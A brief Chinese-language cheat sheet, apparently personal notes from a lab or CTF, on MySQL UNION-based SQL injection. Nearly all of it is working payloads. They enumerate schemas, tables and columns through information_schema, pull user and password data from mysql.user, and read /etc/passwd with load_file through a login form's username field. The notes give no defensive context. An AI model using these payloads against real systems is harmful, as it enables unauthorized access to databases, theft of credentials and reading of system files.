# mysql注入

例子：2，3，4，5注入点，基于网页url（cod=100）的前期参数错传导致报错

```clike
1. 爆数据库
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
2. 爆表
Show Tables in hotel	SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- -

3. 爆列
Show Columns in room	SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -

4. 获取信息
SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -
DBadmin
```

用于sql注入读取文件

```go
uname=' UNION select 1,load_file('/etc/passwd'),3,4,5,6;-- -&password=1
```
